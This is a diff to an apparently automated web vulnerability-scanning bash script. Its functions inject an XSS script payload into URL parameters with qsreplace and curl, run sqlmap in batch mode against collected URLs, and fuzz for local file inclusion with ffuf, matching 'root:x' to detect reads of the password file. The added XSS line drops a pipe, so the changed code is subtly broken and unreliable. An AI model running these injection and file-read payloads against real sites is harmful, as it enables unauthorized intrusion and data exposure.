@@ -127,7 +127,7 @@ echo -e "\n\e[00;34m##################XSS Scanner Started ######################
 xss_scanner(){
 
 cat $domain/gf/xss.txt | kxss | tee $domain/vulnerabilities/xss_scan/kxss.txt
-cat $domain/gf/xss.txt | grep '=' | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee $domain/vulnerabilities/xss_scan/vulnxss.txt
+cat $domain/gf/xss.txt grep '=' | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee $domain/vulnerabilities/xss_scan/vulnxss.txt
 }
 xss_scanner
 sleep 2
@@ -153,6 +153,6 @@ vuln_scan(){
 sqlmap -m $domain/gf/sql.txt --batch --random-agent --level 1 | tee $domain/vulnerabilities/sqli/sqlmap.txt
 sleep 1
 echo -e "\n\e[00;37m#############...Searching For LFI vulnerabilities...#####################\e[00m"
-cat $domain/gf/lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/tools/lfipayloads.txt ; done | tee $domain/vulnerabilities/LFI/lfi.txt
+cat $domain/gf/lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/tools/lfipayloads.txt -of csv -o $domain/vulnerabilities/LFI/lfi.txt -t 50 -c  ; done
 }
 vuln_scan
